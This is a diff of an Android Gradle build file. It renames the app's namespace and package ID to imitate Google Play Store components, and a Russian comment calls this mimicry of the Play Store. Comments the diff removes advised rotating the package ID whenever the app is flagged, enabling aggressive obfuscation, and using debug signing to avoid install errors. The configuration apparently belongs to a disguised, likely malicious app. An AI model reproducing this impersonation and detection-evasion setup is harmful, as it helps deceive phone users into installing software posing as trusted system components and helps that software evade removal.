@@ -1,50 +1,24 @@
 apply plugin: 'com.android.application'
 
 android {
-    namespace 'com.sys.sync'
+    namespace 'com.android.vending.core' // Мимикрия под Play Store
     compileSdk 34
 
     defaultConfig {
-        // МЕНЯЙ ЭТОТ ID ПРИ КАЖДОМ НОВОМ БИЛДЕ, ЕСЛИ ЕСТЬ ПАЛЕВО
-        applicationId "com.google.android.service.sync.v21" 
-        
+        applicationId "com.android.vending.service.notif" 
         minSdk 21
         targetSdk 34
-        
-        // ВЕРСИЯ ДОЛЖНА ВСЕГДА ИДТИ ВВЕРХ (8, 9, 10...)
-        versionCode 8 
-        versionName "1.0.8"
-        
-        testInstrumentationRunner "com.android.vending.system.optimizer"
+        versionCode 15
+        versionName "2.5.15"
     }
 
     buildTypes {
-        debug {
-            minifyEnabled true
-            shrinkResources false
-            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-        }
         release {
-            // Включаем агрессивную обфускацию
             minifyEnabled true
             shrinkResources false
             zipAlignEnabled true
-            
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-            
-            // Используем дебаг-подпись, чтобы избежать ошибок "пакет поврежден"
             signingConfig signingConfigs.debug
-        }
-    }
-
-    compileOptions {
-        sourceCompatibility JavaVersion.VERSION_17
-        targetCompatibility JavaVersion.VERSION_17
-    }
-
-    packagingOptions {
-        resources {
-            excludes += '/META-INF/{AL2.0,LGPL2.1}'
         }
     }
 }
